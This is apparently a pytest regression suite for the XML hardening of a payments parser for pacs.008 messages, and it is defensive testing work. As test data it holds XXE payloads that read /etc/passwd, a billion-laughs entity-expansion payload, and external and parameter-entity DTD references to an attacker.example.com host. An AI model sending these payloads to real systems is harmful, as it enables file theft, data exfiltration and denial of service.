"""Regression tests for XXE and entity-expansion hardening.

Each test feeds the parser a known-malicious payload pattern and asserts
it is rejected with UnsafeXmlError before any entity resolution can occur.
"""

from __future__ import annotations

import pytest

from pactus.core.parsers import UnsafeXmlError, parse_pacs008


class TestRejectsDangerousXml:
    def test_rejects_classic_xxe_file_read(self) -> None:
        """The textbook XXE payload — external entity pointing at a local file."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:pacs.008.001.08">
  &xxe;
</Document>"""
        with pytest.raises(UnsafeXmlError):
            parse_pacs008(payload)

    def test_rejects_billion_laughs(self) -> None:
        """Exponential entity expansion — a classic DoS vector."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<Document>&lol3;</Document>"""
        with pytest.raises(UnsafeXmlError):
            parse_pacs008(payload)

    def test_rejects_external_dtd_reference(self) -> None:
        """A DOCTYPE referencing an external DTD URL."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE Document SYSTEM "http://attacker.example.com/evil.dtd">
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:pacs.008.001.08"/>"""
        with pytest.raises(UnsafeXmlError):
            parse_pacs008(payload)

    def test_rejects_parameter_entity(self) -> None:
        """Parameter entities (%-prefixed) — used in blind XXE exfiltration."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://attacker.example.com/x.dtd"> %pe;]>
<Document/>"""
        with pytest.raises(UnsafeXmlError):
            parse_pacs008(payload)

    def test_rejects_doctype_with_unusual_casing(self) -> None:
        """Defensive: hostile payloads may use mixed-case to bypass naive filters."""
        payload = """<?xml version="1.0"?>
<!DocType foo>
<Document/>"""
        with pytest.raises(UnsafeXmlError):
            parse_pacs008(payload)


class TestSafeXmlStillWorks:
    """The guard must not regress the happy path."""

    def test_existing_fixture_still_parses(self, pacs008_single_xml: str) -> None:
        """The standard fixture (no DOCTYPE, no entities) must parse normally."""
        result = parse_pacs008(pacs008_single_xml)
        assert result.group_header.message_id == "MSG20240508001"

    def test_remittance_info_containing_literal_text_is_allowed(self) -> None:
        """A *value* containing the word ENTITY or DOCTYPE is not a declaration.

        This test guards against the prolog-only scan being mistakenly
        broadened to scan the whole document, which would reject legitimate
        free-text remittance fields.
        """
        from tests.conftest import FIXTURES_DIR

        xml = (FIXTURES_DIR / "test_pacs008_multi.xml").read_text(encoding="utf-8")
        try:
            parse_pacs008(xml)
        except UnsafeXmlError:
            pytest.fail("Benign remittance content was incorrectly flagged as unsafe")
        except Exception:
            pass
